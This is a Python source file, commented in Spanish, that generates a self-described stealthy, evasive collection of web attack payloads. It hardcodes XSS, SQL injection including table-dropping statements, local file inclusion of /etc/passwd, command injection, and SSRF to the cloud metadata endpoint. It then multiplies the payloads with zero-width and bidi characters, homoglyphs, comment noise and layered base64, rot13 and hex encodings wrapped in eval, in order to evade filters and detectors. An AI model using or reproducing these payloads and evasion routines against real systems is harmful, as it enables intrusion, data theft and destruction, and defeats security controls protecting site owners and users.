import random
import string
import urllib.parse
import base64
import base58
import base64 as b64
import codecs

def generate():
    """Generador ultra sigiloso, evasivo y dinámico de payloads con técnicas avanzadas mejoradas."""

    loads = []
    symbols = "!@#$%^&*()-_=+[]{}|;:',.<>/?~`"
    charset = string.ascii_letters + string.digits + symbols

    # Generación masiva de ruido aleatorio para polimorfismo
    for _ in range(1500):
        length = random.randint(15, 100)
        pl = ''.join(random.choices(charset, k=length))
        loads.append(pl)

    # Payloads hardcoded base, ampliados y enriquecidos
    hardcoded = [
        # XSS básicos
        "<script>alert('phantom')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        # SQLi
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "\" OR \"\" = \"",
        "' UNION SELECT NULL--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        # LFI
        "../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "/proc/self/environ",
        # CMD Injection
        "`id`", "$(whoami)", "; ls -la",
        # SSRF
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        # Evasión básica
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "jaVaScRiPt:alert('xss')",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        # Payloads sigilosos
        "normalUserInput123",
        "SELECT * FROM users WHERE id=1",
        "1; DROP TABLE sessions;--"
    ]
    loads += hardcoded

    # Función para insertar caracteres invisibles en todos los payloads
    zero_width_chars = ['\u200b', '\u200c', '\u200d', '\u2060', '\ufeff', '\u180e']

    def insertzwadvanced(text, intensity=0.4):
        result = []
        for ch in text:
            result.append(ch)
            if random.random() < intensity:
                # Inserta uno o más caracteres invisibles seguidos, para mayor camuflaje
                for _ in range(random.randint(1, 3)):
                    result.append(random.choice(zero_width_chars))
        return ''.join(result)

    # Insertar caracteres invisibles también en ruido y hardcoded
    loads += [insertzwadvanced(pl, intensity=0.35) for pl in loads]

    # Técnicas evasivas avanzadas extendidas con más variantes y Unicode homoglyphs
    evasive_xss = [
        # Concatenación dinámica y eval indirecto
        "<scr" + "ipt>alert(String.fromCharCode(88,83,83))</scr" + "ipt>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        # Homoglyphs Unicode
        "<scrіpt>alert('XSS')</scrіpt>",  # 'і' cirílica
        "<scrіpt>alert`\u0061`</scrіpt>",
        # Bypass DOM con atributos rotos
        "<svg><script xlink:href=data:,alert(1)></script>",
        # Comentarios insertados
        "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
        # Eval indirecto
        "<img src=x onerror=(window['ev'+'al'])('alert(1)')>",
        # JS contexto evadido
        "javascript:/*--><script>alert(1)</script>",
        # Obfuscación por XOR simple
        "<script>var _='!';for(i=0;i<_.length;i++)document.write(String.fromCharCode(_.charCodeAt(i)^42));</script>",
        # Uso de Unicode bidi control chars para invisibilidad y confusión
        "<scr\u202eipt>alert(1)</scr\u202eipt>",  # RLO override
        "<script>alert('\u202eXSS')</script>",
        # Encapsulado en plantillas ES6
        "<script>`${alert(1)}`</script>",
        # Inyección en CSS expresiones (IE obsoleto pero potencial)
        "<div style=\"width:expression(alert(1))\"></div>",
        # Data URI con base64 encoded JS
        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
    ]
    loads += evasive_xss

    # Polimorfismo avanzado: mezcla más agresiva de ruido, comentarios, invisibles y saltos de línea
    def polymorphicadvanced(pl):
        mutation = ""
        for char in pl:
            mutation += char
            rand_val = random.random()
            if rand_val < 0.35:
                # mezcla entre distintos tipos de ruido y whitespace
                mutation += random.choice(['<!-- -->', '/*junk*/', '\u200b', '\t', '\n', '\u2060', '\ufeff', '\u180e'])
            elif rand_val < 0.45:
                mutation += random.choice(['&#8203;', '&#8288;', '&#65279;'])  # entidades invisibles HTML
        return mutation

    loads += [polymorphicadvanced(pl) for pl in evasive_xss]

    # Payloads con estructuras no funcionales extendidas para engañar detectores
    fake_valid = [
        "<script type='text/html'>Not real</script>",
        "<input value=\"<script>alert('xss')</script>\">",
        "<div style=\"background:url(javascript:alert(1))\">",
        "<!-- <script>alert('not real')</script> -->",
        "<template><style>body{background:#000}</style></template>",
    ]
    loads += fake_valid

    # Codificaciones profundas extendidas
    def encodepayloadsdeep(pl):
        results = []
        try:
            b64_1 = b64.b64encode(pl.encode()).decode()
            b64_2 = b64.b64encode(b64_1.encode()).decode()
            b32 = base64.b32encode(pl.encode()).decode()
            b85 = base64.b85encode(pl.encode()).decode()
            b58_ = base58.b58encode(pl.encode()).decode()

            # codificaciones adicionales: rot13, hex, uri components con mezcla
            rot13 = codecs.encode(pl, 'rot_13')
            hexed = pl.encode().hex()
            uri_enc = urllib.parse.quote(pl)
            uri_enc_mixed = uri_enc + ''.join(random.choices(string.ascii_letters + string.digits, k=5))

            results.extend([
                f"<script>eval(atob(atob('{b64_2}')))</script>",
                f"<script>eval(atob('{b64_1}'))</script>",
                f"<script>eval(window.atob('{b32}'))</script> <!-- base32 -->",
                f"<script>eval('{b58_}')</script> <!-- base58 (if decoded manually) -->",
                f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in pl)}))</script>",
                f"<script>eval('{rot13}')</script> <!-- rot13 encoded -->",
                f"<script>eval(decodeURIComponent('{uri_enc}'))</script>",
                f"<script>eval(decodeURIComponent('{uri_enc_mixed}'))</script>",
                f"<script>eval('\\x{hexed}')</script> <!-- hex encoded -->",
            ])
        except Exception:
            pass
        return results

    for pl in evasive_xss:
        loads += encodepayloadsdeep(pl)

    # Mutación recursiva más agresiva y caótica (nivel avanzado)
    def recursivemutation(pl, depth=3):
        mutated = pl
        for _ in range(depth):
            mutated = ''.join([
                c + random.choice(['<!-- -->', '\u200c', '/*noise*/', '\n', '\t', '\ufeff', '&#8203;', '\u2060']) if random.random() < 0.45 else c
                for c in mutated
            ])
        return mutated

    loads += [recursivemutation(pl, depth=random.randint(3, 7)) for pl in evasive_xss]

    # DOM contaminado y camuflaje más variado y extenso
    dom_injections = [
        "<div data-x=\"<script>alert(1)</script>\"></div>",
        "<textarea><!--<script>alert('x')</script>--></textarea>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "<video><source onerror=\"alert(1)\"></video>",
        "<template><xss></template><script>alert(1)</script>",
        "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",
        "<object data='javascript:alert(1)'></object>",
        "<details open ontoggle='alert(1)'><summary>Click me</summary></details>",
        "<marquee onstart='alert(1)'>XSS</marquee>",
    ]
    loads += dom_injections

    # Obfuscación de atributos falsos extendida con encoding hexadecimal y entidades Unicode
    attribute_obf = [
        "<img src='x' onerror='&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;(1)'>",
        "<svg><g onload='ja&#x0076;&#x0061;script:alert(1)'></g></svg>",
        "<div onpointerenter='/**/alert(1)/**/'></div>",
        "<input autofocus onfocus=alert(1)>",
        "<form action='javascript:alert(1)'>",
        "<a href='javascript&#58;alert(1)'>Click</a>",
    ]
    loads += attribute_obf

    # Final cleanup: unicidad y mezcla
    loads = list(set(loads))
    random.shuffle(loads)

    return loads
